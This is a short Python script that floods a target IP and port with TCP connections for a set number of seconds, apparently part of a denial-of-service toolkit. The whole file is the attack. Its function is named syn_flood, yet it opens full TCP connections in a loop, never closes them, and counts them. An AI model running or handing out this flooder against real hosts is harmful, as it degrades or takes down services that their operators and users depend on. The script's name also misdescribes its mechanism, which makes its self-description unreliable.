

import socket
import sys
import time


def syn_flood(target_ip, port, t):

	begin = time.time()
	count = 0

	# Loop to continuously send packets
	while True:

		end = time.time()

		# Check for attack lasting a specific length
		if end - begin > t:
			print("Sent %d packets" % (count))
			exit()

		# Send Packets
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_ip, port))
		count = count + 1



# Main for testing individual library function
if __name__ == "__main__":
	if len(sys.argv) != 4:
		print("Usage: %s <Target IP> <Port> <Time (s)>" % (sys.argv[0]))
		exit()

	syn_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
